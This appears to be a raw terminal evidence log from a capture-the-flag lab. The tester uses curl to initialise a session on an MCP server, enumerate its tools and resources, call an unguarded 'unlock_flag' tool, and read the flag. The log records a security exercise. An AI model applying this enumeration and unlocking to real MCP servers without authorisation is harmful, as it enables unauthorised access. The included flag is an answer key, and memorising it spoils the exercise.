@@ -1,0 +1,101 @@
+ARKX Level 7 (Master of Resources) — live re-run, pasted from the Kali terminal.
+Raw evidence file for report/L7_rpc_table_live.md. Nothing edited except blank-line trimming;
+long JSON lines are wrapped by the terminal, so match with whitespace normalised.
+
+──(kali㉿kali)-[~]
+└─$ curl -s -b "$CK" "$BASE/level/7/status"
+{"level":7,"accessible":true,"completed":true,"session_id":"9b031a20e155"}
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s -D h.txt -X POST "$MCP" -b "$CK" \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"manual","version":"1.0"}}}'
+
+grep -i '^mcp-session-id' h.txt
+export SID=$(grep -i '^mcp-session-id' h.txt | tr -d '\r' | awk '{print $2}')
+event: message
+data: {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"prompts":{"listChanged":false},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"Weather","version":"1.27.0"}}}
+
+mcp-session-id: 07b6dd0744e04b3e84a9bfbc0b6b0b1f
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s -D h.txt -X POST "$MCP" -b "$CK" \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"manual","version":"1.0"}}}'
+
+event: message
+data: {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"prompts":{"listChanged":false},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"Weather","version":"1.27.0"}}}
+
+┌──(kali㉿kali)-[~]
+└─$ rpc() { curl -s -X POST "$MCP" -b "$CK" \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  -H "Mcp-Session-Id: $SID" -d "$1"; }
+─(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
+
+event: message
+data: {"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"unlock_flag","description":"Unlocks the flag resource, allowing it to be accessed.","inputSchema":{"properties":{},"title":"unlock_flagArguments","type":"object"},"outputSchema":{"properties":{"result":{"title":"Result","type":"string"}},"required":["result"],"title":"unlock_flagOutput","type":"object"}}]}}
+
+┌──(kali㉿kali)-[~]
+└─$ {"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"unlock_flag","description":"Unlocks the flag resource, allowing it to be accessed.","inputSchema":{"properties":{},"title":"unlock_flagArguments","type":"object"},"outputSchema":{...}}]}}
+jsonrpc:2.0,id:2,result:{tools:[name:unlock_flag]}: command not found
+
+┌──(kali㉿kali)-[~]
+└─$ 
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
+event: message
+data: {"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"unlock_flag","description":"Unlocks the flag resource, allowing it to be accessed.","inputSchema":{"properties":{},"title":"unlock_flagArguments","type":"object"},"outputSchema":{"properties":{"result":{"title":"Result","type":"string"}},"required":["result"],"title":"unlock_flagOutput","type":"object"}}]}}
+
+┌──(kali㉿kali)-[~]
+└─$ {"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"unlock_flag","description":"Unlocks the flag resource, allowing it to be accessed.","inputSchema":{"properties":{},"title":"unlock_flagArguments","type":"object"},"outputSchema":{...}}]}}
+jsonrpc:2.0,id:2,result:{tools:[name:unlock_flag]}: command not found
+
+┌──(kali㉿kali)-[~]
+└─$ 
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
+event: message
+data: {"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"unlock_flag","description":"Unlocks the flag resource, allowing it to be accessed.","inputSchema":{"properties":{},"title":"unlock_flagArguments","type":"object"},"outputSchema":{"properties":{"result":{"title":"Result","type":"string"}},"required":["result"],"title":"unlock_flagOutput","type":"object"}}]}}
+
+(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":3,"method":"resources/list"}'
+event: message
+data: {"jsonrpc":"2.0","id":3,"result":{"resources":[{"name":"get_flag","uri":"resource://flag","description":"","mimeType":"text/plain"},{"name":"get_super_secret","uri":"resource://super-secret","description":"Returns the super secret to the user","mimeType":"text/plain"}]}}
+
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":3,"method":"resources/list"}' | jq
+jq: parse error: Invalid numeric literal at line 1, column 6
+
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":3,"method":"resources/list"}'     
+event: message
+data: {"jsonrpc":"2.0","id":3,"result":{"resources":[{"name":"get_flag","uri":"resource://flag","description":"","mimeType":"text/plain"},{"name":"get_super_secret","uri":"resource://super-secret","description":"Returns the super secret to the user","mimeType":"text/plain"}]}}
+
+┌──(kali㉿kali)-[~]
+└─$ 
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":4,"method":"resources/read","params":{"uri":"resource://flag"}}'
+event: message
+data: {"jsonrpc":"2.0","id":4,"result":{"contents":[{"uri":"resource://flag","mimeType":"text/plain","text":"flag is locked"}]}}
+
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"unlock_flag","arguments":{}}}'
+event: message
+data: {"jsonrpc":"2.0","id":5,"result":{"content":[{"type":"text","text":"Flag has been unlocked! You can now access the flag resource."}],"structuredContent":{"result":"Flag has been unlocked! You can now access the flag resource."},"isError":false}}
+
+─$ 
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":6,"method":"resources/read","params":{"uri":"resource://flag"}}'
+event: message
+data: {"jsonrpc":"2.0","id":6,"result":{"contents":[{"uri":"resource://flag","mimeType":"text/plain","text":"You did it! the flag is: flag-841bcd"}]}}
+
+┌──(kali㉿kali)-[~]
+└─$ tmux capture-pane -p     
+┌──(kali㉿kali)-[~]
+└─$ rpc '{"jsonrpc":"2.0","id":6,"method":"resources/read","params":{"uri":"resource://flag"}}'
+event: message
+data: {"jsonrpc":"2.0","id":6,"result":{"contents":[{"uri":"resource://flag","mimeType":"text/plain","text":"You did it! the flag is: flag-841bcd"}]}}
